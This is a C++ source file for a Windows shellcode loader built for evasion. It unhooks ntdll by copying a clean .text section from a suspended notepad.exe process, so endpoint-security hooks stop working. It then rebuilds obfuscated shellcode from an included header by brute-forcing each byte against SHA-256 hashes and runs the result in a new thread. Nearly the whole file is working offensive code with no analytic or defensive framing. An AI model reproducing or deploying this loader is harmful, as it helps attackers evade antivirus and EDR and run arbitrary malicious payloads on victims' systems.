#define UNICODE
#define _UNICODE
#include <windows.h>
#include "shellcode.h"
#include <cstdio>


#include <Psapi.h>
#include <cstring>
#include <winnt.h>

// Source - https://stackoverflow.com/q/2262386
// Posted by stan, modified by community. See post 'Timeline' for change history
// Retrieved 2026-10-29, License - CC BY-SA 3.0


#include <openssl/evp.h>


bool isEc(unsigned char brut1,const char* hash){
    unsigned char hashed[EVP_MAX_MD_SIZE];
    size_t hashedLen= 0;



    if (EVP_Q_digest(nullptr,"SHA256",nullptr,&brut1,1,hashed,&hashedLen )){

    char hashedHex[EVP_MAX_MD_SIZE*2 +1];

    for (size_t  i = 0 ; i< hashedLen ;i++ ){
        sprintf(&hashedHex[i*2],"%02x",hashed[i]);

    }

    hashedHex[hashedLen*2]='\0' ;
    return strcmp(hashedHex,hash)==0;

    }
    return false;


    
}

int main(){


        LPVOID ntdlll = nullptr;


        HANDLE HCProcess=GetCurrentProcess();



        LPCTSTR ntdll=L"ntdll.dll";
        HMODULE GNtdllH=GetModuleHandle(ntdll);

        MODULEINFO moduleInfoo;
        ZeroMemory(&moduleInfoo,sizeof(MODULEINFO));


        GetModuleInformation(HCProcess,GNtdllH,&moduleInfoo,sizeof(MODULEINFO));

        PIMAGE_DOS_HEADER PimageDosHeaderHooked=(PIMAGE_DOS_HEADER)moduleInfoo.lpBaseOfDll;
        PIMAGE_NT_HEADERS PimageNtHeaderHooked=(PIMAGE_NT_HEADERS)((ULONG_PTR)moduleInfoo.lpBaseOfDll+PimageDosHeaderHooked->e_lfanew);


        STARTUPINFO startupInfoo;
        ZeroMemory(&startupInfoo,sizeof(STARTUPINFO));

        PROCESS_INFORMATION processInformationn;  
        ZeroMemory(&processInformationn,sizeof(PROCESS_INFORMATION));


        CreateProcessW(L"C:\\Windows\\System32\\notepad.exe",NULL,NULL,NULL,TRUE,CREATE_SUSPENDED,NULL,NULL,&startupInfoo,&processInformationn);


        HANDLE HHeap=GetProcessHeap();
        LPVOID CDNtdll=HeapAlloc(HHeap,0,moduleInfoo.SizeOfImage);

        ReadProcessMemory(processInformationn.hProcess,(LPCVOID)moduleInfoo.lpBaseOfDll,CDNtdll,moduleInfoo.SizeOfImage,nullptr);


        PIMAGE_DOS_HEADER PimageNewDosHeader=(PIMAGE_DOS_HEADER)CDNtdll;
        PIMAGE_NT_HEADERS PimageNewNtHeader=(PIMAGE_NT_HEADERS)((ULONG_PTR)CDNtdll+PimageNewDosHeader->e_lfanew);




        for (WORD i=0 ;i <PimageNtHeaderHooked->FileHeader.NumberOfSections; i++ ){

            PIMAGE_SECTION_HEADER hookedSection=(PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(PimageNtHeaderHooked)+((ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

            if (!strcmp((PCHAR)hookedSection->Name,".text")){

                LPVOID hookedTextSection= (LPVOID)((ULONG_PTR)moduleInfoo.lpBaseOfDll+(DWORD_PTR)hookedSection->VirtualAddress);

                LPVOID newTextSection= (LPVOID)((ULONG_PTR)CDNtdll+(DWORD_PTR)hookedSection->VirtualAddress);

                DWORD oldProtect=0;

                VirtualProtect(hookedTextSection,hookedSection->Misc.VirtualSize,PAGE_EXECUTE_READWRITE,&oldProtect);

                RtlCopyMemory(hookedTextSection,newTextSection,hookedSection->Misc.VirtualSize);

                VirtualProtect (hookedTextSection,hookedSection->Misc.VirtualSize,oldProtect,&oldProtect);

                
            }

        }
        TerminateProcess(processInformationn.hProcess,0);





        DWORD numSizeOfSh=sizeof(shellcode)/sizeof(shellcode[0]);

        BYTE* alBuffer = (BYTE*)VirtualAlloc(NULL,numSizeOfSh,0x00002000 | 0x00001000,PAGE_READWRITE);
        
        for (size_t i = 0; i < numSizeOfSh; i++)
        {
            for (size_t j = 0; j < 256; j++)
            {
                unsigned char brut1= (unsigned char)j^ shellcode[i].randomm ;
                
                if (isEc(brut1,shellcode[i].hash))
                {
                    alBuffer[i] =(unsigned char)j;
                    break;
                }
                
            }
            
        }
        DWORD holdNp=0;
        if(VirtualProtect(alBuffer,numSizeOfSh,0x20,&holdNp)){

            FlushInstructionCache(HCProcess,alBuffer,numSizeOfSh);  
            

            HANDLE trd=CreateThread(NULL, 0,(LPTHREAD_START_ROUTINE)alBuffer, NULL,0,NULL);      
            if (trd){
                WaitForSingleObject(trd,INFINITE);
            }

            CloseHandle(trd);


        }
        VirtualProtect(alBuffer,numSizeOfSh,holdNp,&holdNp);

            
        
        return 0 ;


}